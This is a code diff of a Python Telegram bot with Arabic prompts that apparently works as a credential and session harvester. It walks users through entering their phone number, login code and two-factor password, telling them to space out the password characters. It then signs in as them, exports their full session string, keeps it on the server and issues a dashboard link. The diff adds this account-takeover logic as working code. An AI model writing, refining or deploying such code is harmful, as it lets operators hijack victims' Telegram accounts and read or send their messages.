@@ -3,10 +3,8 @@ import secrets
 import asyncio
 import threading
 from flask import Flask, request, jsonify, send_file
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
-from pyrogram import Client as PyroClient
-from pyrogram.errors import SessionPasswordNeeded
+from pyrogram import Client, filters
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
 import logging
 
 logging.basicConfig(level=logging.INFO)
@@ -20,116 +18,104 @@ BASE_URL = os.environ.get("BASE_URL", "")
 app = Flask(__name__)
 sessions = {}
 user_tokens = {}
-user_loops = {}
+user_state = {}
+user_data = {}
 user_clients = {}
 user_code_hash = {}
 
-PHONE, CODE, PASSWORD = range(3)
+bot_loop = None
+bot = None
 
-def get_user_loop(user_id):
-    if user_id not in user_loops:
-        loop = asyncio.new_event_loop()
-        user_loops[user_id] = loop
-        t = threading.Thread(target=loop.run_forever, daemon=True)
-        t.start()
-    return user_loops[user_id]
+WAIT_PHONE = "WAIT_PHONE"
+WAIT_CODE = "WAIT_CODE"
+WAIT_PASSWORD = "WAIT_PASSWORD"
 
-def run_in_user_loop(user_id, coro):
-    loop = get_user_loop(user_id)
-    future = asyncio.run_coroutine_threadsafe(coro, loop)
-    return future.result(timeout=30)
+async def send_msg(chat_id, text, reply_markup=None):
+    await bot.send_message(chat_id, text, reply_markup=reply_markup)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567"
-    )
-    return PHONE
+async def handle_start(client, message):
+    user_id = message.from_user.id
+    user_state[user_id] = WAIT_PHONE
+    await message.reply("👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567")
 
-async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text.strip()
-    user_id = update.effective_user.id
-    context.user_data["phone"] = phone
+async def handle_message(client, message):
+    user_id = message.from_user.id
+    text = message.text.strip()
+    state = user_state.get(user_id)
 
-    async def do_connect():
-        client = PyroClient(
-            name=f"u_{user_id}",
+    if state == WAIT_PHONE:
+        await handle_phone(client, message, user_id, text)
+    elif state == WAIT_CODE:
+        await handle_code(client, message, user_id, text)
+    elif state == WAIT_PASSWORD:
+        await handle_password(client, message, user_id, text)
+    else:
+        await message.reply("اكتب /start للبدء")
+
+async def handle_phone(client, message, user_id, phone):
+    user_data[user_id] = {"phone": phone}
+    try:
+        pyro = Client(
+            name=f"user_{user_id}",
             api_id=API_ID,
             api_hash=API_HASH,
             in_memory=True
         )
-        await client.connect()
-        sent = await client.send_code(phone)
-        user_clients[user_id] = client
+        await pyro.connect()
+        sent = await pyro.send_code(phone)
+        user_clients[user_id] = pyro
         user_code_hash[user_id] = sent.phone_code_hash
-
-    try:
-        run_in_user_loop(user_id, do_connect())
-        await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
-        return CODE
+        user_state[user_id] = WAIT_CODE
+        await message.reply("✅ وصلك رمز على تلغرام، أرسله هنا:")
     except Exception as e:
-        await update.message.reply_text(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
-        return ConversationHandler.END
+        await message.reply(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
+        user_state.pop(user_id, None)
 
-async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.strip().replace(" ", "")
-    phone = context.user_data["phone"]
-    user_id = update.effective_user.id
-    client = user_clients.get(user_id)
+async def handle_code(client, message, user_id, code):
+    code = code.replace(" ", "")
+    phone = user_data[user_id]["phone"]
+    pyro = user_clients.get(user_id)
     phone_hash = user_code_hash.get(user_id)
-
-    async def do_signin():
-        await client.sign_in(phone, phone_hash, code)
-
     try:
-        run_in_user_loop(user_id, do_signin())
-        return await finish_login(update, context, client, user_id)
+        await pyro.sign_in(phone, phone_hash, code)
+        await finish_login(message, user_id, pyro)
     except SessionPasswordNeeded:
-        await update.message.reply_text(
+        user_state[user_id] = WAIT_PASSWORD
+        await message.reply(
             "🔐 حسابك عنده مصادقة ثنائية!\n\n"
             "أرسل كلمة المرور بشكل مفرق\n"
             "مثال: h e l l o 1 2 3"
         )
-        return PASSWORD
+    except (PhoneCodeInvalid, PhoneCodeExpired):
+        await message.reply("❌ الرمز خاطئ أو منتهي\nأرسل الرمز مرة ثانية:")
     except Exception as e:
-        await update.message.reply_text(f"❌ الرمز خاطئ: {e}\nأرسل مرة ثانية:")
-        return CODE
+        await message.reply(f"❌ خطأ: {e}\nأرسل الرمز مرة ثانية:")
 
-async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    password = update.message.text.strip().replace(" ", "")
-    user_id = update.effective_user.id
-    client = user_clients.get(user_id)
-
-    async def do_password():
-        await client.check_password(password)
-
+async def handle_password(client, message, user_id, password):
+    password = password.replace(" ", "")
+    pyro = user_clients.get(user_id)
     try:
-        run_in_user_loop(user_id, do_password())
-        return await finish_login(update, context, client, user_id)
+        await pyro.check_password(password)
+        await finish_login(message, user_id, pyro)
     except Exception:
-        await update.message.reply_text("❌ كلمة المرور خاطئة\nحاول مرة ثانية:")
-        return PASSWORD
+        await message.reply("❌ كلمة المرور خاطئة\nحاول مرة ثانية:")
 
-async def finish_login(update, context, client, user_id):
-    phone = context.user_data["phone"]
-
-    async def do_export():
-        return await client.export_session_string()
-
-    session_str = run_in_user_loop(user_id, do_export())
+async def finish_login(message, user_id, pyro):
+    phone = user_data[user_id]["phone"]
+    session_str = await pyro.export_session_string()
     sessions[phone] = session_str
     token = secrets.token_hex(16)
     user_tokens[user_id] = token
     dashboard_url = f"{BASE_URL}/dashboard?token={token}"
-    keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
-    await update.message.reply_text(
+    from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)
+    ]])
+    user_state.pop(user_id, None)
+    await message.reply(
         "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        reply_markup=keyboard
     )
-    return ConversationHandler.END
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("تم الإلغاء. اكتب /start للبدء من جديد.")
-    return ConversationHandler.END
 
 @app.route("/")
 def index():
@@ -151,24 +137,22 @@ def send_messages():
     return jsonify({"status": "ok"})
 
 def run_bot():
-    async def start_bot():
-        application = Application.builder().token(BOT_TOKEN).build()
-        await application.bot.delete_webhook(drop_pending_updates=True)
-        conv = ConversationHandler(
-            entry_points=[CommandHandler("start", start)],
-            states={
-                PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
-                CODE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
-                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
-            },
-            fallbacks=[CommandHandler("cancel", cancel)],
-        )
-        application.add_handler(conv)
-        await application.run_polling()
+    global bot, bot_loop
+    bot_loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(bot_loop)
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_bot())
+    bot = Client(
+        name="bot",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        bot_token=BOT_TOKEN,
+        in_memory=True
+    )
+
+    bot.on_message(filters.command("start"))(handle_start)
+    bot.on_message(filters.text & ~filters.command("start"))(handle_message)
+
+    bot_loop.run_until_complete(bot.run())
 
 if __name__ == "__main__":
     t = threading.Thread(target=run_bot, daemon=True)
